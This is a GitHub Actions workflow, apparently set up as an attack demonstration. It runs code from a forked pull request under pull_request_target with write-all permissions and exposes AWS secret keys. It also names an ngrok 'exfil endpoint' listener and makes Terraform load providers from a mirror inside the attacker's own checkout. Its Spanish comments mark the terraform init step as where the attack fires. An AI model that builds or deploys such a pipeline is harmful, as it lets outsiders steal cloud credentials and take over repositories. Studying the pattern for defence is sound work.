name: "Terraform CI"

on:
  pull_request:
    branches: [ "main" ]  

  pull_request_target:
    types: [opened, synchronize]

jobs:
  terraform:
    name: "Terraform Execution"
    runs-on: ubuntu-latest
    
    # PERMISOS ALTOS + SECRETOS INYECTADOS EN EL ENTORNO
    permissions: write-all
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      DEMO_EXFIL_ENDPOINT: "https://punk-scary-shucking.ngrok-free.dev" # O la iURL de tu listener

    steps:
      # Checkout directo del código del PR (fork)
      - name: Checkout PR Code
        uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v2
        with:
          terraform_version: 1.3.9

      # Configurar mirror local si estás usando el binario precompilado
      - name: Configure Local Mirror (.terraformrc)
        run: |
          echo 'provider_installation {
            filesystem_mirror {
              path    = "${{ github.workspace }}/mirror"
              include = ["registry.terraform.io/demo/*"]
            }
            direct {
              exclude = ["registry.terraform.io/demo/*"]
            }
          }' > ~/.terraformrc

      # AQUÍ SE DISPARA EL ATAQUE
      - name: Terraform Init
        run: terraform init

      - name: Terraform Plan
        run: terraform plan -no-color
